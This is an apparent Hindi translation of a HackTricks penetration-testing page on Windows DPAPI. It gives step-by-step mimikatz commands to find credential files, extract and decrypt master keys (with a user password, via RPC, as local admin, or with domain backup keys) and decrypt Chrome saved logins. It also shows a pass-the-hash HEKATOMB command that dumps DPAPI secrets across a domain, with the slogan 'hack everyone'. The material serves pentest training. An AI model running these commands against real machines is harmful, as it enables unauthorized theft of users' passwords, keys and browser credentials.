# DPAPI - पासवर्ड निकालना

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल** हों या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण** करें।**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके अपना योगदान दें।**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) स्पेन में सबसे महत्वपूर्ण साइबर सुरक्षा इवेंट है और यूरोप में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** की मिशन के साथ, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उबलता हुआ मिलन स्थान है।

{% embed url="https://www.rootedcon.com/" %}

इस पोस्ट को बनाते समय mimikatz को DPAPI के साथ संबंधित हर कार्रवाई के साथ समस्याएं थीं, इसलिए **अधिकांश उदाहरण और छवियां यहां से ली गई थीं**: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)

## DPAPI क्या है

विंडोज ऑपरेटिंग सिस्टम में इसका प्राथमिक उपयोग असममित्र निजी कुंजीयों के सममित्र एन्क्रिप्शन करने के लिए किया जाता है, जहां उपयोगकर्ता या सिस्टम सीमितता के योगदान के रूप में एंट्रोपी का महत्वपूर्ण योगदान के रूप में एक सममित्र कुंजी का उपयोग करता है।\
**DPAPI विकासकों को उपयोगकर्ता के लॉगऑन सीक्रेट से एक सममित्र कुंजी का उपयोग करके कुंजीयों को एन्क्रिप्ट करने की अनुमति देता है**, या सिस्टम एन्क्रिप्शन के मामले में, सिस्टम के डोमेन प्रमाणीकरण सीक्रेट का उपयोग करके।

इससे डेवलपर को बहुत आसानी से डेटा को कंप्यूटर में **एन्क्रिप्टेड डेटा** सहेजने में मदद मिलती है **बिना** चिंता किए **एन्क्रिप्शन** **कुंजी** को **सुरक्षित** कैसे **रखें**।

### DPAPI क्या सुरक्षित करता है?

DPAPI का उपयोग निम्नलिखित व्यक्तिगत डेटा की सुरक्षा के लिए किया जाता है:

* इंटरनेट एक्सप्लोरर, Google \*Chrome में पासवर्ड और फॉर्म ऑटो-संपूर्णता डेटा
* Outlook, Windows Mail, Windows Mail आदि में ईमेल खाता पासवर्ड
* आंतरिक FTP प्रबंधक खाता पासवर्ड
* साझा फ़ोल्डर और संसाधन उपयोग पासवर्ड
* वायरलेस नेटवर्क खाता कुंजी और पासवर्ड
* विंडोज कार्डस्पेस और विंडोज वॉल्ट में एन्क्रिप्शन कुंजी
* रिमोट डेस्कटॉप कनेक्शन पासवर्ड, .NET पासपोर्ट
* एन्क्रिप्टिंग फ़ाइल सिस्टम (EFS), मेल S-MIME को एन्क्रिप्ट करना, अन्य उपयोगकर्ता के प्रमाणपत्र, इंटरनेट जानकारी सेवाओं में SSL/TLS
* EAP/TLS और 802.1x (VPN और WiFi प्रमाणीकरण)
* Credential Manager में नेटवर्क पासवर्ड
* API फ़ंक्शन CryptProtectData का उपयोग करके किसी भी एप्लिकेशन में प्रोग्रामेटिक रूप से सुरक्षित व्यक्तिगत डेटा। उदाहरण के लिए, Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk आदि में
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## क्रेडेंशियल फ़ाइलें

**मास्टर पासवर्ड द्वारा संरक्षित क्रेडेंशियल फ़ाइलें** निम्नलिखित स्थानों पर स्थित हो सकती हैं:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
एमिकेट्ज़ का उपयोग करके प्रमाणीकरण जानकारी प्राप्त करें `dpapi::cred`, प्रतिक्रिया में आपको एन्क्रिप्टेड डेटा और गाइडमास्टरकी जैसी रोचक जानकारी मिल सकती है।
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
आप **mimikatz मॉड्यूल** `dpapi::cred` का उपयोग कर सकते हैं उचित `/masterkey` के साथ डिक्रिप्ट करने के लिए:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## मास्टर कुंजी

उपयोगकर्ता की RSA कुंजी को एन्क्रिप्ट करने के लिए उपयोग होने वाली DPAPI कुंजी `%APPDATA%\Microsoft\Protect\{SID}` निर्देशिका में संग्रहीत की जाती है, जहां {SID} उपयोगकर्ता का [**सुरक्षा पहचानकर्ता**](https://en.wikipedia.org/wiki/Security\_Identifier) होता है। **DPAPI कुंजी मास्टर कुंजी के साथी फ़ाइल में संग्रहीत की जाती है जो उपयोगकर्ता की निजी कुंजी को सुरक्षित करती है**। यह आमतौर पर यादृच्छिक डेटा के 64 बाइट होती है। (ध्यान दें कि यह निर्देशिका सुरक्षित होती है, इसलिए आप `cmd` से `dir` का उपयोग करके इसे सूचीबद्ध नहीं कर सकते हैं, लेकिन आप PS से इसे सूचीबद्ध कर सकते हैं)।
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
एक उपयोगकर्ता के एक संग्रह की रूप में मास्टर कुंजी की दिखावट इस तरह होगी:

![](<../../.gitbook/assets/image (324).png>)

सामान्यतः **प्रत्येक मास्टर कुंजी एक एन्क्रिप्टेड सममित कुंजी होती है जो अन्य सामग्री को डिक्रिप्ट कर सकती है**। इसलिए, इसे डिक्रिप्ट करने के लिए **एन्क्रिप्टेड मास्टर कुंजी** को **निकालना** दृश्यमान होता है ताकि इसके साथ एन्क्रिप्ट की गई **अन्य सामग्री** को बाद में **डिक्रिप्ट** किया जा सके।

### मास्टर कुंजी निकालें और डिक्रिप्ट करें

पिछले खंड में हमने guidMasterKey को ढूंढ़ा जो इस तरह दिखता है `3e90dd9e-f901-40a1-b691-84d7f647b8fe`, यह फ़ाइल इसमें होगी:
```
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>
```
जहां आप मिमीकैट्स के साथ मास्टर कुंजी को निकाल सकते हैं:
```bash
# If you know the users password
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected

# If you don't have the users password and inside an AD
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc
```
फ़ाइल की मास्टर कुंजी आउटपुट में दिखाई देगी।

अंत में, आप उस **मास्टरकी** का उपयोग करके **क्रेडेंशियल फ़ाइल** को **डिक्रिप्ट** कर सकते हैं:
```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
```
### व्यवस्थापक के साथ सभी स्थानीय मास्टर कुंजी निकालें

यदि आप व्यवस्थापक हैं, तो आप निम्नलिखित उपयोग करके dpapi मास्टर कुंजी प्राप्त कर सकते हैं:
```
sekurlsa::dpapi
```
![](<../../.gitbook/assets/image (326).png>)

### डोमेन एडमिन के साथ सभी बैकअप मास्टर कुंजी निकालें

एक डोमेन एडमिन बैकअप dpapi मास्टर कुंजी प्राप्त कर सकता है जो एन्क्रिप्टेड कुंजी को डिक्रिप्ट करने के लिए उपयोग की जा सकती है:
```
lsadump::backupkeys /system:dc01.offense.local /export
```
![](<../../.gitbook/assets/image (327).png>)

प्राप्त की गई बैकअप कुंजी का उपयोग करके, चलिए उपयोगकर्ता 'spotless' की मास्टर कुंजी को डिक्रिप्ट करें:
```bash
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```
अब हम उपयोगकर्ता के एनक्रिप्टेड मास्टर कुंजी का उपयोग करके उनके `spotless` क्रोम सीक्रेट्स को डिक्रिप्ट कर सकते हैं:
```
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```
![](<../../.gitbook/assets/image (329).png>)

## डेटा को एन्क्रिप्ट और डिक्रिप्ट करना

आप डेटा को डीपीएपीआई का उपयोग करके मिमीकैट्स और सी++ का उपयोग करके एन्क्रिप्ट और डिक्रिप्ट करने का उदाहरण यहां पा सकते हैं: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
आप डेटा को डीपीएपीआई का उपयोग करके सी# का उपयोग करके एन्क्रिप्ट और डिक्रिप्ट करने का उदाहरण यहां पा सकते हैं: [https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) [@gentilkiwi](https://twitter.com/gentilkiwi) के [Mimikatz](https://github.com/gentilkiwi/mimikatz/) प्रोजेक्ट से कुछ DPAPI क्षमताओं का C# पोर्ट है।

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक टूल है जो LDAP निर्देशिका से सभी उपयोगकर्ताओं और कंप्यूटरों को निकालने और RPC के माध्यम से डोमेन कंट्रोलर बैकअप कुंजी को निकालने की क्रिया को स्वचालित करता है। स्क्रिप्ट फिर सभी कंप्यूटरों के आईपी ​​पते को संक्षेप में लाएगा और डोमेन बैकअप कुंजी के साथ सभी उपयोगकर्ताओं के सभी DPAPI ब्लॉब्स को पुनः प्राप्त करने के लिए सभी कंप्यूटरों पर smbclient का उपयोग करेगा।

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP कंप्यूटर सूची से निकाले गए कंप्यूटर सूची के साथ आप उन्हें नहीं जानते होने के बावजूद हर सब नेटवर्क पा सकते हैं!

"क्योंकि डोमेन व्यवस्थापक अधिकार पर्याप्त नहीं होते हैं। सभी को हैक करो।"

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) स्वचालित रूप से DPAPI द्वारा संरक्षित गुप्त जानकारी को डंप कर सकता है।

## संदर्भ

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) स्पेन में सबसे महत्वपूर्ण साइबर सुरक्षा घटना है और यूरोप में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** की मिशन के साथ, यह कांग्रेस हर विषय में टेक्नोलॉजी और साइबर सुरक्षा विशेषज्ञों के लिए एक उबलता हुआ मिलन स्थान है।

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की अनुमति चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण करें।**
* **अपने हैकिंग ट्रिक्स साझा करें और PR** जमा करके [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को डालकर।**

</details>
